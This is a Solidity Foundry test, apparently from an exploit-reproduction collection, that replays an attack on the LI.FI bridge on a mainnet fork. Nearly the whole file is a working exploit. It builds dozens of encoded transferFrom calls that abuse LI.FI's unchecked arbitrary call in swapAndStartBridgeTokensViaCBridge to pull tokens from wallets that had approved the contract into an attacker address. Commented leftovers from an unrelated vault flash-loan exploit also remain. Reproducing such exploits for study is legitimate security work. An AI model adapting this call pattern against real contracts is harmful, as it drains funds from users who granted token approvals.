// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

interface ILIFI {
    struct LiFiData {
        bytes32 transactionId;
        string integrator;
        address referrer;
        address sendingAssetId;
        address receivingAssetId;
        address receiver;
        uint256 destinationChainId;
        uint256 amount;
    }
    struct SwapData {
        address callTo;
        address approveTo;
        address sendingAssetId;
        address receivingAssetId;
        uint256 fromAmount;
        bytes callData;
    }
    struct CBridgeData {
        address receiver;
        address token;
        uint256 amount;
        uint64 dstChainId;
        uint64 nonce;
        uint32 maxSlippage;
    }
    function swapAndStartBridgeTokensViaCBridge(LiFiData memory _liFiData,SwapData[] calldata _swapData,CBridgeData memory _cBridgeData) external payable;
}

contract ContractTest is DSTest {
    address from = address(0x00c6f2bde06967e04caaf4bf4e43717c3342680d76);
    address lifi = address(0x005a9fd7c39a6c488e715437d7b1f3c823d5596ed1);
    address exploiter = address(0x00878099f08131a18fab6bb0b4cfc6b6dae54b177e);
    IUniswapV2Pair pair = IUniswapV2Pair(0xbcab7d083Cf6a01e0DdA9ed7F8a02b47d125e682);
    IERC20 usdc = IERC20(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75);
    IOneRingVault vault = IOneRingVault(0x4e332D616b5bA1eDFd87c899E534D996c336a2FC);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    
    
    function setUp() public {
        cheats.createSelectFork("mainnet", 14420686);//fork mainnet at block 14420686
        
    }

    function testExploit() public {
        cheats.startPrank(from); 
        ILIFI.LiFiData memory _lifiData = ILIFI.LiFiData({
            transactionId: 0x1438ff9dd1cf9c70002c3b3cbec9c4c1b3f9eb02e29bcac90289ab3ba360e605,
            integrator: "li.finance",
            referrer: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0xdAC17F958D2ee523a2206206994597C13D831ec7,
            receivingAssetId: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 
            receiver: 0x878099F08131a18Fab6bB0b4Cfc6B6DAe54b177E,
            destinationChainId: 42161,
            amount: 50000000
        });
        ILIFI.SwapData[] memory _swapData = new ILIFI.SwapData[](38);
        _swapData[0] = ILIFI.SwapData({
            approveTo: 0xDef1C0ded9bec7F1a1670819833240f027b25EfF,
            callData: hex"d9627aa400000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000002faf0800000000000000000000000000000000000000000000000000000000002625a0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", 
            // sellToUniswap(address[],uint256,uint256,bool)
            // {
            //     "tokens":[
            //     0:"0xdac17f958d2ee523a2206206994597c13d831ec7"
            //     1:"0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"
            //     ]
            //     "sellAmount":"50000000"
            //     "minBuyAmount":"40000000"
            //     "isSushi":false
            // }
            callTo: 0xDef1C0ded9bec7F1a1670819833240f027b25EfF,
            fromAmount: 50000000,
            receivingAssetId: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
            sendingAssetId: 0xdAC17F958D2ee523a2206206994597C13D831ec7 // fromAssetId
            // if (!LibAsset.isNativeAsset(fromAssetId) && LibAsset.getOwnBalance(fromAssetId) < fromAmount) {
            //     LibAsset.transferFromERC20(_swapData.sendingAssetId, msg.sender, address(this), fromAmount);
            // }

            // if (!LibAsset.isNativeAsset(fromAssetId)) {
            //     LibAsset.approveERC20(IERC20(fromAssetId), _swapData.approveTo, fromAmount);
            // }

            // // solhint-disable-next-line avoid-low-level-calls
            // (bool success, bytes memory res) = _swapData.callTo.call{ value: msg.value }(_swapData.callData);
        });
        _swapData[1] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd000000000000000000000000445c21166a3cb20b14fa84cfc5d122f6bd3ffa17000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e0000000000000000000000000000000000000000000000a4a88a24badca2e52e", // transferFrom(address,address,uint256)
            callTo: 0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0, 
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[2] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd0000000000000000000000009b36f2bc04cd5b8a38715664263a3b3b856bc1cf000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e000000000000000000000000000000000000000000000005d38a3a4feb066cdb",
            callTo: 0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[3] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd0000000000000000000000005a7517b2a3a390aaec27d24b1621d0b9d7898dd4000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e0000000000000000000000000000000000000000000000026e91d77e24f35800",
            callTo: 0xB4EFd85c19999D84251304bDA99E90B92300Bd93,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[4] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd0000000000000000000000009241f27daffd0bb1df4f2a022584dd6c77843e64000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e0000000000000000000000000000000000000000000000000d1b335f4a843b00",
            callTo: 0x6810e776880C02933D47DB1b9fc05908e5386b96,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[5] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd0000000000000000000000008de133a0859b847623c282b4dc5e18de5dbfd7d1000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e0000000000000000000000000000000000000000000000000000002a3c4547b2",
            callTo: 0xdAC17F958D2ee523a2206206994597C13D831ec7,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[6] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd0000000000000000000000009241f27daffd0bb1df4f2a022584dd6c77843e64000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e0000000000000000000000000000000000000000000000000000001c15d7994f",
            callTo: 0xdAC17F958D2ee523a2206206994597C13D831ec7,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[7] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd000000000000000000000000d92b2a99da006e72b48a14e4c23766e22b4ce395000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e00000000000000000000000000000000000000000000000000000002540be400",
            callTo: 0xdAC17F958D2ee523a2206206994597C13D831ec7,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[8] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd000000000000000000000000ffd2a8f4275e76288d31dbb756ce0e6065a3d766000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e000000000000000000000000000000000000000000000000000000010ad40bb4",
            callTo: 0xdAC17F958D2ee523a2206206994597C13D831ec7,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[9] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd0000000000000000000000007c89a5373312f9a02dd5c5834b4f2e3e6ce1cd96000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e0000000000000000000000000000000000000000000000000000000c13102d87",
            callTo: 0xdAC17F958D2ee523a2206206994597C13D831ec7,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[10] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd0000000000000000000000005b9e4d0dd21f4e071729a9eb522a2366abed149a000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e0000000000000000000000000000000000000000000000000000000016e1996e",
            callTo: 0xdAC17F958D2ee523a2206206994597C13D831ec7,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[11] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd000000000000000000000000684abeba554fdb4a5dae32d652f198e25b64dc6e000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e0000000000000000000000000000000000000000000000000000000000000000",
            callTo: 0xdAC17F958D2ee523a2206206994597C13D831ec7,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[12] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd00000000000000000000000015697225d98885a4b007381ccf0006270d851a35000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e0000000000000000000000000000000000000000000000013e81d656f96060f4",
            callTo: 0x72e364F2ABdC788b7E918bc238B21f109Cd634D7,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[13] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd000000000000000000000000dffd8bbf8dcaf236c4e009ff6013bfc98407b6c0000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e000000000000000000000000000000000000000000000000000000003b9aca00",
            callTo: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[14] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd0000000000000000000000002182e4f2034bf5451f168d0643b2083150ab7931000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e000000000000000000000000000000000000000000000000000000002341895c",
            callTo: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[15] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd000000000000000000000000195b8b9598904b55e9770492bd697529492034a2000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e000000000000000000000000000000000000000000000000000000003d7ffdf1",
            callTo: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[16] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd0000000000000000000000005b7ab4b4b4768923cddef657084223528c807963000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e000000000000000000000000000000000000000000000000000000002e28786b",
            callTo: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[17] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd00000000000000000000000080e7ed83354833aa7b87988f7e0426cffe238a83000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e000000000000000000000000000000000000000000000000000000003ba2ff5a",
            callTo: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[18] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd0000000000000000000000000586fcc2d0d400596ff326f30debaa3a79e33c25000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e0000000000000000000000000000000000000000000000000000000000000000",
            callTo: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[19] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd000000000000000000000000cc77df7e9959c60e7ec427367e1ae6e2720d6735000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e000000000000000000000000000000000000000000000000000000012f226a2a",
            callTo: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[20] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd00000000000000000000000045372cce828e185bfb008942cfe42a4c5cc76a75000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e000000000000000000000000000000000000000000000000000000000b01afa3",
            callTo: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[21] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd00000000000000000000000014b2af25e47f590a145aad5be781687ca20edd97000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e000000000000000000000000000000000000000000000000000000005c486b90",
            callTo: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[22] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd0000000000000000000000003942ae3782fbd658cc19a8db602d937baf7cb57a000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e0000000000000000000000000000000000000000000000000000000122ddf27c",
            callTo: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[23] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd000000000000000000000000461e76a4fe9f27605d4097a646837c32f1ccc31c000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e000000000000000000000000000000000000000000000000000000039021c46d",
            callTo: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[24] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd00000000000000000000000000dacfd769bc30e4f64805761707573cb710552c000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e00000000000000000000000000000000000000000000000000000000b3ee10b4",
            callTo: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[25] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd000000000000000000000000e5aedd6520c4d4e0cb4ee78784a0187d34d55adc000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e000000000000000000000000000000000000000000000000000000002f033358",
            callTo: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[26] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd000000000000000000000000574a782a00dd152d98ff85104f723575d870698e000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e00000000000000000000000000000000000000000000000000000025fdc6ab6c",
            callTo: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[27] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd000000000000000000000000899cc16c88173de60f3c830d004507f8da3f975f000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e00000000000000000000000000000000000000000000000000000000256a21f1",
            callTo: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[28] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd000000000000000000000000acf65a171c67a7074ee671240967696ab5d1185f000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e000000000000000000000000000000000000000000000000000000008de801a3",
            callTo: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[29] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd0000000000000000000000002e70c44b708028a925a8021723ac92fb641292df000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e000000000000000000000000000000000000000000000000000000002540be40",
            callTo: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[30] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd000000000000000000000000b0d497a6cff14e0a0079d5feff0c51c929f5fc8d000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e0000000000000000000000000000000000000000000000412e421a86d8d8f62c",
            callTo: 0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[31] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd00000000000000000000000026ab154c70aec017d78e6241da76949c37b171e2000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e0000000000000000000000000000000000000000000000007cc17a1fe0d54df3",
            callTo: 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[32] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd000000000000000000000000dba64f019c92649cf645d598322ae1ae2318e55b000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e000000000000000000000000000000000000000000001cf8379e3ed13620c0fb",
            callTo: 0x8A9C67fee641579dEbA04928c4BC45F66e26343A,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[33] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd000000000000000000000000461e76a4fe9f27605d4097a646837c32f1ccc31c000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e00000000000000000000000000000000000000000000002024f6b417294747f9",
            callTo: 0x6B175474E89094C44Da98b954EedeAC495271d0F,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[34] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd00000000000000000000000045f3fc38441b1aa7b60f8aad8954582b17c9503c000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e000000000000000000000000000000000000000000000049ab7af30eb3094af1",
            callTo: 0x6B175474E89094C44Da98b954EedeAC495271d0F,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[35] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd0000000000000000000000006e5c200a784ba062ab770e6d317637f2fc82e53d000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e000000000000000000000000000000000000000000000122896df4db9525ea3d",
            callTo: 0x6B175474E89094C44Da98b954EedeAC495271d0F,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[36] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd0000000000000000000000000bc06c67b5740b2cc0a54d9281a7bce5fd70984d000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e000000000000000000000000000000000000000000000036a008c79eef365851",
            callTo: 0x6B175474E89094C44Da98b954EedeAC495271d0F,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });
        _swapData[37] = ILIFI.SwapData({
            approveTo: 0x0000000000000000000000000000000000000000,
            callData: hex"23b872dd0000000000000000000000000df4fde307f216a7da118ad7eaec500d42eecc5f000000000000000000000000878099f08131a18fab6bb0b4cfc6b6dae54b177e0000000000000000000000000000000000000000000000058dc1f67fb2f0f28a",
            callTo: 0x6B175474E89094C44Da98b954EedeAC495271d0F,
            fromAmount: 0,
            receivingAssetId: 0x0000000000000000000000000000000000000000,
            sendingAssetId: 0x0000000000000000000000000000000000000000
        });

        ILIFI.CBridgeData memory _cBridgeData = ILIFI.CBridgeData({
            amount:40000000,
            dstChainId:42161,
            maxSlippage:255921,
            nonce:1647074829664,
            receiver: 0x878099F08131a18Fab6bB0b4Cfc6B6DAe54b177E,
            token: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
        });
        
        ILIFI(lifi).swapAndStartBridgeTokensViaCBridge(_lifiData, _swapData, _cBridgeData);
    //     emit log_named_uint("Before exploit, USDC  balance of attacker:", usdc.balanceOf(msg.sender));
    //  pair.swap(80000000*1e6,0,address(this),new bytes(1));
    //     emit log_named_uint("After exploit, USDC  balance of attacker:", usdc.balanceOf(msg.sender));
    }
    // function hook(address sender, uint amount0, uint amount1, bytes calldata data) external{
    //     usdc.approve(address(vault),type(uint256).max);
    //     vault.depositSafe(amount0,address(usdc),1);
    //     vault.withdraw(vault.balanceOf(address(this)),address(usdc));
    //     usdc.transfer(msg.sender,(amount0/9999*10000)+10000);
    //     usdc.transfer(tx.origin,usdc.balanceOf(address(this)));
    // }
}
